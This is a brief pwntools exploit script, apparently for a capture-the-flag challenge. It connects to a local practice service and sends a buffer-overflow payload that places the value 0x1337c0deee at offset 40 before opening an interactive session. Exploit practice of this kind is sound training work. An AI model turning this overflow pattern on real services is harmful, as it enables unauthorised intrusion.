from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '127.0.0.1', 4009

#io = process(exe)
io = remote(host, port)

offset = 40
payload = flat({
    offset: [
        0x1337c0deee
    ]
})

io.sendlineafter(b'payload: ', payload)
io.interactive()
